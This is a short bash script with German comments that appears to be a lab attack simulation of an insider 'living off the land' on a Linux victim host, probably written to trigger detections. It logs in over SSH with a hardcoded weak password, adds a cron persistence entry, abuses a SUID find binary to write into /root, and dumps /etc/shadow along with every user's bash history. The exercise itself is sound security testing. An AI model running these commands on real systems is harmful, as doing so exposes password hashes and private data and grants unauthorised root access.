#!/usr/bin/env bash
# Szenario 2 - Insider / Living off the Land. Kein Exploit, keine
# Malware, nur Bordmittel. Ausfuehrung als legitimer User auf victim.
#   E4 sudo | E5 Cron-Persistenz | E6 SUID-Missbrauch | E7 sensibler Zugriff
set -uo pipefail

VICTIM="${VICTIM_IP:-192.168.20.5}"
USER="${WEAK_USER:-sysops}"
PASS="${WEAK_PASS:-Sommer2025}"
SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"

on_victim() { sshpass -p "${PASS}" ssh ${SSH_OPTS} "${USER}@${VICTIM}" 'bash -s'; }

echo "[*] Szenario 2 - Start: $(date --iso-8601=seconds)"

echo "[E4] Rechteausweitung ueber sudo"
on_victim <<'REMOTE'
sudo id
REMOTE

echo "[E5] Persistenz ueber einen neuen Cronjob"
on_victim <<'REMOTE'
( crontab -l 2>/dev/null; echo '*/5 * * * * /bin/true' ) | crontab -
crontab -l
REMOTE

echo "[E6] SUID-Missbrauch: find laeuft mit Root-Rechten"
on_victim <<'REMOTE'
find . -maxdepth 0 -exec whoami \;
find . -maxdepth 0 -exec touch /root/pwned_via_suid \;
ls -la /root/pwned_via_suid
REMOTE

echo "[E7] Massenlesezugriff auf /etc/shadow und Home-Verzeichnisse"
on_victim <<'REMOTE'
sudo cat /etc/shadow
for f in /home/*/.bash_history; do echo "== $f =="; sudo cat "$f"; done
REMOTE

echo "[*] Szenario 2 - Ende: $(date --iso-8601=seconds)"
